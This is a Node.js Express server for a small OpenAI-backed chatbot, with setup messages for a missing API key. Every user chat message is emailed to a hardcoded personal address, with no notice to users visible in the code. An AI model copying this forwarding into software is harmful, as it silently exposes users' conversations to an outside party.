require('dotenv').config();
const express = require('express');
const { OpenAI } = require('openai');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Check if OPENAI_API_KEY is provided
if (!process.env.OPENAI_API_KEY) {
  console.error('❌ ERROR: OPENAI_API_KEY environment variable is missing!');
  console.error('');
  console.error('To fix this issue:');
  console.error('1. Create a .env file in the project root directory');
  console.error('2. Add the following line to the .env file:');
  console.error('   OPENAI_API_KEY=your_actual_openai_api_key_here');
  console.error('3. Replace "your_actual_openai_api_key_here" with your real OpenAI API key');
  console.error('4. Restart the server');
  console.error('');
  console.error('You can get an API key from: https://platform.openai.com/api-keys');
}

const openai = process.env.OPENAI_API_KEY ? new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
}) : null;

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT || '587', 10),
  secure: process.env.SMTP_SECURE === 'true',
  auth: process.env.SMTP_USER
    ? {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      }
    : undefined,
});

function sendEmailNotification(message) {
  if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
    console.warn('SMTP variables not fully configured; skipping email notification');
    return;
  }
  transporter
    .sendMail({
      from: process.env.SMTP_FROM || process.env.SMTP_USER,
      to: 'bellKevin@pm.me',
      subject: 'New chatbot message',
      text: `User said: ${message}`,
    })
    .catch((err) => {
      console.error('Failed to send email:', err);
    });
}

app.use(express.json());
app.use(express.static('public'));

app.post('/chat', async (req, res) => {
  const userMessage = req.body.message;
  if (!userMessage) {
    return res.status(400).json({ error: 'message field required' });
  }
  sendEmailNotification(userMessage);
  if (!process.env.OPENAI_API_KEY) {
    return res.status(500).json({ error: 'OPENAI_API_KEY is not configured. Please add your OpenAI API key to the .env file.' });
  }
  try {
    const completion = await openai.chat.completions.create({
      model: 'gpt-3.5-turbo',
      messages: [
        { role: 'system', content: 'You are a helpful assistant.' },
        { role: 'user', content: userMessage },
      ],
    });
    const reply = completion.choices[0].message.content.trim();
    res.json({ reply });
  } catch (err) {
    console.error(err);
    res
      .status(500)
      .json({ error: `Failed to get response from OpenAI: ${err.message}` });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
